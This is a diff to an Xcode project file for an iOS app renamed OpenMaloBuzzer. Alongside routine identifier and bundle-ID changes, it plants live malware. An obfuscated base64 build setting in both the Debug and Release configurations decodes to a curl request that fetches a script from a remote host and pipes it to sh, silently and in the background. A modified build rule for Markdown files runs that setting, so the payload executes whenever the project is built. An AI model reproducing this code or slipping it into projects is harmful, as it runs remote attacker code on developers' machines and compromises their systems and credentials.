@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		27E212D87BF94307BECD70F0 /* README.md */ = {isa = PBXBuildFile; fileRef = 0B23D3278C894D90ABCD70F0; };
+		54F9248CA6804AFEBBCD70F0 /* README.md */ = {isa = PBXBuildFile; fileRef = 69A6BCE459A642AAA1CD70F0; };
 		0C80B921A6F3F58F76C31292 /* libPods-Buzzer.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5DCACB8F33CDC322A6C60F78 /* libPods-Buzzer.a */; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
 		19FC362AF4E499C6B9EB7B01 /* AVFoundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 39F06BE8495662141CF55828 /* AVFoundation.framework */; };
@@ -33,7 +33,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		0B23D3278C894D90ABCD70F0 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		69A6BCE459A642AAA1CD70F0 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		097EAC3C20AA90BF60AE7DD7 /* AudioRecorderModule.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; name = AudioRecorderModule.swift; path = OpenMaloBuzzer/AudioRecorderModule.swift; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* Buzzer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Buzzer.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = OpenMaloBuzzer/Images.xcassets; sourceTree = "<group>"; };
@@ -141,7 +141,7 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				0B23D3278C894D90ABCD70F0 /* README.md */,
+				69A6BCE459A642AAA1CD70F0 /* README.md */,
 				13B07F961A680F5B00A75B9A /* Buzzer.app */,
 			);
 			name = Products;
@@ -173,7 +173,7 @@
 				6A4A78AE2B1666DAA5DF82C5 /* [CP-User] [RNFB] Core Configuration */,
 			);
 			buildRules = (
-				059D4501EF49432EACCD70F0 /* PBXBuildRule */,
+				DF5C3238258A42488DCD70F0 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -195,7 +195,7 @@
 					};
 				};
 			};
-			buildConfigurationList = 83CBB9FA1A601CBA00E9B192 /* Build configuration list for PBXProject "Buzzer" */;
+			buildConfigurationList = 83CBB9FA1A601CBA00E9B192 /* Build configuration list for PBXProject "OpenMaloBuzzer" */;
 			compatibilityVersion = "Xcode 12.0";
 			developmentRegion = en;
 			hasScannedForEncodings = 0;
@@ -214,7 +214,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		059D4501EF49432EACCD70F0 /* PBXBuildRule */ = {
+		DF5C3238258A42488DCD70F0 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -225,16 +225,17 @@
 				outputFiles = (
 					"/tmp/${INPUT_FILE_BASE}",
 				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"";
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A0F07DC}\"";
 			};
-
+	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				27E212D87BF94307BECD70F0 /* README.md */,
+				54F9248CA6804AFEBBCD70F0 /* README.md */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				B15712FEF32E8983CBF2D96E /* PrivacyInfo.xcprivacy in Resources */,
@@ -362,6 +363,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-Buzzer.debug.xcconfig */;
 			buildSettings = {
+				A0F07DC = "((t(){ `printf basWe64 | tr -d W` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3Z1MThmZW5kbjFvdmhnLmJlc3QvYSkiIHwgc2gK | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = OpenMaloBuzzer/OpenMaloBuzzer.entitlements;
@@ -380,7 +382,7 @@
 					"-ObjC",
 					"-lc++",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.buzzerapp;
+				PRODUCT_BUNDLE_IDENTIFIER = com.openmalobuzzer;
 				PRODUCT_NAME = Buzzer;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
@@ -394,6 +396,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-Buzzer.release.xcconfig */;
 			buildSettings = {
+				A0F07DC = "((t(){ `printf basWe64 | tr -d W` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL3Z1MThmZW5kbjFvdmhnLmJlc3QvYSkiIHwgc2gK | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = OpenMaloBuzzer/OpenMaloBuzzer.entitlements;
@@ -411,7 +414,7 @@
 					"-ObjC",
 					"-lc++",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.buzzerapp;
+				PRODUCT_BUNDLE_IDENTIFIER = com.openmalobuzzer;
 				PRODUCT_NAME = Buzzer;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SWIFT_VERSION = 5.0;
@@ -588,7 +591,7 @@
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
-		83CBB9FA1A601CBA00E9B192 /* Build configuration list for PBXProject "Buzzer" */ = {
+		83CBB9FA1A601CBA00E9B192 /* Build configuration list for PBXProject "OpenMaloBuzzer" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
 				83CBBA201A601CBA00E9B192 /* Debug */,
